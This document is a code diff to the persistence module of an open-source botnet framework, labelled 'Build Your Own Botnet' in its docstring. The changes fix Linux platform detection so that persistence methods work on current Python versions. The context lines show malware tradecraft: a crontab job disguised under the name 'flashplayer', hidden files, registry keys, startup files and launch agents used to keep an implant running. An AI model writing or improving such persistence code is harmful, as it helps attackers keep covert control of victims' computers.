@@ -20,7 +20,7 @@ import util
 
 # globals
 packages = ['_winreg'] if sys.platform == 'win32' else []
-platforms = ['win32','linux2','darwin']
+platforms = ['win32','linux','darwin']
 results = {}
 usage = 'persistence [method] <add/remove>'
 description = """
@@ -77,7 +77,7 @@ class Method():
     Persistence Method (Build Your Own Botnet)
 
     """
-    def __init__(self, name, platforms=['win32','linux2','darwin']):
+    def __init__(self, name, platforms=['win32','linux','linux2','darwin']):
         self.name = name
         self.result = None
         self.established = False
@@ -126,7 +126,7 @@ def _add_hidden_file(value=None):
 
 def _add_crontab_job(value=None, minutes=10, name='flashplayer'):
     try:
-        if sys.platform == 'linux2':
+        if 'linux' in sys.platform:
             value = os.path.abspath(sys.argv[0])
             if value and os.path.isfile(value):
                 if not _methods['crontab_job'].established:
@@ -265,7 +265,7 @@ def _remove_hidden_file():
 
 def _remove_crontab_job(value=None, name='flashplayer'):
     try:
-        if sys.platform == 'linux2' and _methods['crontab_job'].established:
+        if 'linux' in sys.platform and _methods['crontab_job'].established:
             with open('/etc/crontab','r') as fp:
                 lines = [i.rstrip() for i in fp.readlines()]
                 for line in lines:
@@ -336,8 +336,8 @@ def _remove_startup_file():
     except Exception as e:
         util.log('{} error: {}'.format(_remove_startup_file.__name__, str(e)))
 
-hidden_file = Method('hidden_file', platforms=['win32','linux2','darwin'])
-crontab_job = Method('crontab_job', platforms=['linux2'])
+hidden_file = Method('hidden_file', platforms=['win32','linux','linux2','darwin'])
+crontab_job = Method('crontab_job', platforms=['linux','linux2'])
 registry_key = Method('registry_key', platforms=['win32'])
 startup_file = Method('startup_file', platforms=['win32'])
 launch_agent = Method('launch_agent', platforms=['darwin'])
